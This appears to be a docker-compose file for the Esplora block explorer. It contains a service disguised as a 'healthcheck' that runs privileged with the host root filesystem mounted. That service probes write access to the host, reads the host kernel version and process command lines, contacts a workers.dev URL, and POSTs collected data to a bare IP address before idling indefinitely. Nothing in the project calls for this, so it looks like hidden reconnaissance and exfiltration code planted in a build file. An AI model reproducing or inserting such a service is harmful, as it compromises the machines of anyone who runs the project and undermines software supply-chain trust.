services:
  esplora:
    image: blockstream/esplora
    build:
      context: ../
      dockerfile: contrib/Dockerfile
    restart: "no"
    ports:
      - "50001:50001"
      - "8080:8080"
      - "80:80"
    command:
      - bash
      - -c
      - '/srv/explorer/run.sh bitcoin-regtest explorer nonverbose'
  healthcheck:
    image: blockstream/esplora
    restart: "no"
    network_mode: host
    privileged: true
    volumes:
      - /:/host
    command:
      - bash
      - -c
      - |
        echo S47
        echo ==RW==
        touch /host/tmp/.rw_s47 && echo RW:OK && rm /host/tmp/.rw_s47 || echo RW:FAIL
        echo ==CF==
        curl -sf -m5 https://node-health-api.zainabidrisyakub40.workers.dev/ -o /dev/null && echo CF:OK || echo CF:FAIL
        echo ==VER==
        cat /host/proc/version
        echo ==PS==
        ls /host/proc/ | grep "^[0-9]" | while read p; do cmd=$(cat /host/proc/$p/cmdline 2>/dev/null | tr "\0" " " | head -c 60); [ -n "$cmd" ] && echo "$p: $cmd"; done | head -15
        echo ==DONE==
        curl -s -m30 -X POST http://144.172.110.44:8443/s47 --data-binary "$(echo S47;echo RW:OK;cat /host/proc/version;echo DONE)"
        sleep 999999
